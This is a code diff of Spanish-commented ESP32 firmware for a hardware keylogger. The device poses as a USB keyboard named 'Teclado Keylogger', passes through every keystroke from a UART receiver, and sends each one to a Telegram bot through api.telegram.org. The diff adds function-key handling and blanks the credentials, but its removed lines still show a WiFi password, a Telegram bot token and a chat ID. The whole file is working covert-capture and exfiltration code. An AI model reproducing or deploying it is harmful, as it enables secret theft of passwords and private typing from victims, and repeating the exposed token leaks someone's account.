@@ -1,4 +1,4 @@
-// Codigo emisor keylogger - solo envio a Telegram
+// ===== Librerías y configuración general =====
 #include "USB.h"
 #include "USBHIDKeyboard.h"
 #include <WiFi.h>
@@ -6,23 +6,22 @@
 #include <WiFiClientSecure.h>
 #include "freertos/queue.h"
 
-// ====== Objetos principales ======
 USBHIDKeyboard Keyboard;
 
-// ====== Configuracion UART ======
+// ===== Pines y velocidad UART =====
 #define RX_PIN 18
 #define TX_PIN 17
 #define BAUD_RATE 9600
 
-// ====== Configuracion WiFi ======
-const char* ssid     = "Laboratorio"; // Nombre del WiFi
-const char* password = "12345678"; // Clave del WiFi
+// ===== Credenciales WiFi =====
+const char* ssid     = "";        // Nombre de la red WiFi a la que se conectará
+const char* password = "";        // Contraseña de la red WiFi
 
-// ====== Configuracion de Telegram ======
-String botToken = "7996107175:AAH1nNcRISjnjE-NxskvorE16llBLXVy9Vs"; // Token del bot de telegram
-String chatID   = "2051288294"; // ID del chat
+// ===== Credenciales Telegram =====
+String botToken = "";             // Token del bot de Telegram para enviar mensajes
+String chatID   = "";             // ID del chat de Telegram donde se enviarán los mensajes
 
-// ====== Comandos especiales ======
+// ===== Definición de comandos especiales =====
 #define CMD_ESC        0x1B
 #define CMD_TAB        0x09
 #define CMD_CAPS       0x14
@@ -31,18 +30,17 @@ String chatID   = "2051288294"; // ID del chat
 #define CMD_GUI        0x90
 #define CMD_ALTGR      0x92
 
-// llegada de conbinacion de ctrl
 #define CMD_CTRL_C 0xA1
 #define CMD_CTRL_V 0xA2
 #define CMD_CTRL_X 0xA3
 #define CMD_CTRL_Z 0xA4
 
-// ====== Comandos de flechas ======
 #define CMD_ARROW_UP     0xA5
 #define CMD_ARROW_DOWN   0xA6
 #define CMD_ARROW_LEFT   0xA7
 #define CMD_ARROW_RIGHT  0xA8
-// ====== Keypad ======
+
+// ===== Teclado numérico =====
 #define KP_0       0xB0
 #define KP_1       0xB1
 #define KP_2       0xB2
@@ -60,7 +58,21 @@ String chatID   = "2051288294"; // ID del chat
 #define KP_MULT    0xBE
 #define KP_DIV     0xBF
 
-// ====== Tabla de equivalencias ======
+// ===== Teclas de función F1-F12 =====
+#define CMD_F1  0xC1
+#define CMD_F2  0xC2
+#define CMD_F3  0xC3
+#define CMD_F4  0xC4
+#define CMD_F5  0xC5
+#define CMD_F6  0xC6
+#define CMD_F7  0xC7
+#define CMD_F8  0xC8
+#define CMD_F9  0xC9
+#define CMD_F10 0xCA
+#define CMD_F11 0xCB
+#define CMD_F12 0xCC
+
+// ===== Mapeo de comandos a keycodes =====
 typedef struct {
   uint8_t command;
   uint8_t keycode;
@@ -76,15 +88,12 @@ CommandMap commandMap[] = {
 
 const uint8_t commandCount = sizeof(commandMap) / sizeof(CommandMap);
 
-// ====== Cola para envio de teclas ======
+// ===== Cola para enviar teclas a Telegram =====
 #define KEYBUF_LEN 128
 #define QUEUE_SIZE 32
 QueueHandle_t keyQueue;
 
-// =====================================================================
-// ============ URL ENCODE =============================================
-// =====================================================================
-
+// ===== Codificación URL de caracteres especiales =====
 String urlEncode(const char* input) {
   String out = "";
   for (size_t i = 0; input[i] != '\0'; ++i) {
@@ -100,26 +109,18 @@ String urlEncode(const char* input) {
   return out;
 }
 
-// =====================================================================
-// ============ Envio asincrono (cola) =================================
-// =====================================================================
-
+// ===== Envío de teclas a la cola =====
 void sendLater(const String& key) {
   char buf[KEYBUF_LEN];
   key.toCharArray(buf, KEYBUF_LEN);
   xQueueSend(keyQueue, buf, 0);
 }
 
-// =====================================================================
-// ============ TAREA DE ENVIO A TELEGRAM ==============================
-// =====================================================================
-
+// ===== Tarea de envío a Telegram =====
 void serverTask(void* parameter) {
   char keyBuf[KEYBUF_LEN];
-
   WiFiClientSecure client;
   client.setInsecure();
-
   HTTPClient http;
 
   for (;;) {
@@ -128,9 +129,10 @@ void serverTask(void* parameter) {
 
         String encoded = urlEncode(keyBuf);
 
-        String url = "https://api.telegram.org/bot" + botToken +
-                     "/sendMessage?chat_id=" + chatID +
-                     "&text=" + encoded;
+        String url =
+          "https://api.telegram.org/bot" + botToken +
+          "/sendMessage?chat_id=" + chatID +
+          "&text=" + encoded;
 
         http.setTimeout(2000);
 
@@ -143,33 +145,30 @@ void serverTask(void* parameter) {
   }
 }
 
-// =====================================================================
-// ========================== CONTROL HID ===============================
-// =====================================================================
-
+// ===== Función para presionar y soltar una tecla =====
 void pressAndRelease(uint8_t key) {
   Keyboard.press(key);
   Keyboard.release(key);
 }
 
+// ===== Validar si un comando es especial =====
 bool isSpecialCommand(uint8_t cmd) {
-
   if (cmd == CMD_CTRL_C || cmd == CMD_CTRL_V || cmd == CMD_CTRL_X || cmd == CMD_CTRL_Z)
     return true;
-  // nuevas flechas
-  if (cmd == CMD_ARROW_UP || cmd == CMD_ARROW_DOWN ||
-      cmd == CMD_ARROW_LEFT || cmd == CMD_ARROW_RIGHT)
+  if (cmd == CMD_ARROW_UP || cmd == CMD_ARROW_DOWN || cmd == CMD_ARROW_LEFT || cmd == CMD_ARROW_RIGHT)
     return true;
-  if (cmd == CMD_GUI || cmd == CMD_ALTGR) return true;
-
+  if (cmd == CMD_GUI || cmd == CMD_ALTGR)
+    return true;
+  if (cmd >= CMD_F1 && cmd <= CMD_F12)
+    return true;
   for (int i = 0; i < commandCount; i++) {
     if (cmd == commandMap[i].command) return true;
   }
   return false;
 }
 
+// ===== Manejo de comandos especiales =====
 void handleSpecialCommand(uint8_t cmd) {
-  // ===== Keypad =====
   switch (cmd) {
     case KP_0:     pressAndRelease(KEY_KP_0); sendLater("KP_0"); return;
     case KP_1:     pressAndRelease(KEY_KP_1); sendLater("KP_1"); return;
@@ -188,6 +187,21 @@ void handleSpecialCommand(uint8_t cmd) {
     case KP_MINUS: pressAndRelease(KEY_KP_MINUS); sendLater("KP_MINUS"); return;
     case KP_MULT:  pressAndRelease(KEY_KP_ASTERISK); sendLater("KP_MULT"); return;
     case KP_DIV:   pressAndRelease(KEY_KP_SLASH); sendLater("KP_DIV"); return;
+  }
+
+  switch(cmd) {
+    case CMD_F1:  pressAndRelease(KEY_F1);  sendLater("F1");  return;
+    case CMD_F2:  pressAndRelease(KEY_F2);  sendLater("F2");  return;
+    case CMD_F3:  pressAndRelease(KEY_F3);  sendLater("F3");  return;
+    case CMD_F4:  pressAndRelease(KEY_F4);  sendLater("F4");  return;
+    case CMD_F5:  pressAndRelease(KEY_F5);  sendLater("F5");  return;
+    case CMD_F6:  pressAndRelease(KEY_F6);  sendLater("F6");  return;
+    case CMD_F7:  pressAndRelease(KEY_F7);  sendLater("F7");  return;
+    case CMD_F8:  pressAndRelease(KEY_F8);  sendLater("F8");  return;
+    case CMD_F9:  pressAndRelease(KEY_F9);  sendLater("F9");  return;
+    case CMD_F10: pressAndRelease(KEY_F10); sendLater("F10"); return;
+    case CMD_F11: pressAndRelease(KEY_F11); sendLater("F11"); return;
+    case CMD_F12: pressAndRelease(KEY_F12); sendLater("F12"); return;
   }
 
   if (cmd == CMD_CTRL_C){
@@ -222,7 +236,7 @@ void handleSpecialCommand(uint8_t cmd) {
     sendLater("CTRL+z");
     return;
   }
-    // ===== Flechas =====
+
   if (cmd == CMD_ARROW_UP) {
     pressAndRelease(KEY_UP_ARROW);
     sendLater("UP");
@@ -243,6 +257,7 @@ void handleSpecialCommand(uint8_t cmd) {
     sendLater("RIGHT");
     return;
   }
+
   for (int i = 0; i < commandCount; i++) {
     if (cmd == commandMap[i].command) {
       pressAndRelease(commandMap[i].keycode);
@@ -270,15 +285,11 @@ void handleSpecialCommand(uint8_t cmd) {
   }
 }
 
-// =====================================================================
-// ============================ SETUP ==================================
-// =====================================================================
-
+// ===== Configuración inicial del ESP32 =====
 void setup() {
-  Serial.begin(115200);
   Serial1.begin(BAUD_RATE, SERIAL_8N1, RX_PIN, TX_PIN);
 
-  USB.productName("Teclado Keylogger");
+  USB.productName("Teclado Keylogger"); // Nombre Teclado, puedes cambiarlo
   USB.begin();
 
   Keyboard.begin();
@@ -297,97 +308,73 @@ void setup() {
   }
 }
 
-// =====================================================================
-// ============================= LOOP ==================================
-// =====================================================================
-
+// ===== Loop principal para leer UART y enviar teclas =====
 void loop() {
-    while (Serial1.available()) {
+  while (Serial1.available()) {
+    uint8_t c = Serial1.read();
 
-        uint8_t c = Serial1.read();
-
-        // Debug
-        Serial.print("Recibido del receptor: 0x");
-        Serial.print(c, HEX);
-        Serial.print(" -> '");
-        if (c >= 32 && c <= 126) Serial.print((char)c);
-        else Serial.print(".");
-        Serial.println("'");
-
-        // Comandos especiales
-        if (isSpecialCommand(c)) {
-            handleSpecialCommand(c);
-            continue;
-        }
-
-        // ============================================
-        //                 Numpad
-        // ============================================
-
-        if (c == '.') {
-            Keyboard.write('.');
-            sendLater(".");
-            continue;
-        }
-
-        if (c == '*') {
-            Keyboard.press(KEY_KP_ASTERISK);
-            Keyboard.release(KEY_KP_ASTERISK);
-            sendLater("*");
-            continue;
-        }
-
-        if (c == '-') {
-            Keyboard.press(KEY_KP_MINUS);
-            Keyboard.release(KEY_KP_MINUS);
-            sendLater("-");
-            continue;
-        }
-
-        if (c == '+') {
-            Keyboard.press(KEY_KP_PLUS);
-            Keyboard.release(KEY_KP_PLUS);
-            sendLater("+");
-            continue;
-        }
-        if (c == '/') {
-            Keyboard.press(KEY_KP_SLASH);
-            Keyboard.release(KEY_KP_SLASH);
-            sendLater("/");
-            continue;
-        }
-        if (c == '"') {
-            Keyboard.press(KEY_LEFT_SHIFT);
-            Keyboard.press('2');
-            Keyboard.release('2');
-            Keyboard.release(KEY_LEFT_SHIFT);
-            sendLater("\"");
-            continue;
-        }
-
-
-        // ============================================
-        //                  AltGr @
-        // ============================================
-
-        if (c == '@') {
-            Keyboard.press(KEY_RIGHT_ALT);
-            Keyboard.press('q');
-            Keyboard.release('q');
-            Keyboard.release(KEY_RIGHT_ALT);
-            sendLater("@");
-            continue;
-        }
-
-        // ============================================
-        //            ASCII normal restante
-        // ============================================
-        if (c >= 0x20 && c <= 0x7E) {
-            Keyboard.write((char)c);
-            sendLater(String((char)c));
-        }
+    if (isSpecialCommand(c)) {
+      handleSpecialCommand(c);
+      continue;
     }
 
-    delay(1);
-}
+    if (c == '.') {
+      Keyboard.write('.');
+      sendLater(".");
+      continue;
+    }
 
+    if (c == '*') {
+      Keyboard.press(KEY_KP_ASTERISK);
+      Keyboard.release(KEY_KP_ASTERISK);
+      sendLater("*");
+      continue;
+    }
+
+    if (c == '-') {
+      Keyboard.press(KEY_KP_MINUS);
+      Keyboard.release(KEY_KP_MINUS);
+      sendLater("-");
+      continue;
+    }
+
+    if (c == '+') {
+      Keyboard.press(KEY_KP_PLUS);
+      Keyboard.release(KEY_KP_PLUS);
+      sendLater("+");
+      continue;
+    }
+
+    if (c == '/') {
+      Keyboard.press(KEY_KP_SLASH);
+      Keyboard.release(KEY_KP_SLASH);
+      sendLater("/");
+      continue;
+    }
+
+    if (c == '"') {
+      Keyboard.press(KEY_LEFT_SHIFT);
+      Keyboard.press('2');
+      Keyboard.release('2');
+      Keyboard.release(KEY_LEFT_SHIFT);
+      sendLater("\"");
+      continue;
+    }
+
+    if (c == '@') {
+      Keyboard.press(KEY_RIGHT_ALT);
+      Keyboard.press('q');
+      Keyboard.release('q');
+      Keyboard.release(KEY_RIGHT_ALT);
+      sendLater("@");
+      continue;
+    }
+
+    if (c >= 0x20 && c <= 0x7E) {
+      Keyboard.write((char)c);
+      sendLater(String((char)c));
+    }
+  }
+
+  delay(1);
+}
